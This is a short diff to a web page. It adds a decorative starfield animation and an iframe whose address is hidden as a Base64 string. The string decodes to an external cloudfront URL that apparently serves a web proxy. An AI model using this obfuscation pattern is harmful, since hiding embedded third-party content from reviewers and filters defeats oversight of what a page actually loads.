@@ -101,4 +101,21 @@
     const background = document.getElementById('background');
 
     for (let i = 0; i < numStars; i++) {
-      const star = docum
+      const star = document.createElement('div');
+      star.classList.add('star');
+      star.style.width = `${Math.random() * 3}px`;
+      star.style.height = star.style.width;
+      star.style.left = `${Math.random() * 100}vw`;
+      star.style.top = `${Math.random() * 100}vh`;
+      background.appendChild(star);
+    }
+
+    // URL codificada em Base64 (atualizada)
+    const encoded = "aHR0cHM6Ly9kZnMzcnpxNDR2NmFzLmNsb3VkZnJvbnQubmV0Lz9mcmFtZT1mdWxsc2NyZWVuLyMvcHJ4eQ==";
+    const url = atob(encoded);
+    const iframe = document.createElement("iframe");
+    iframe.src = url;
+    document.getElementById("iframeContainer").appendChild(iframe);
+  </script>
+</body>
+</html>
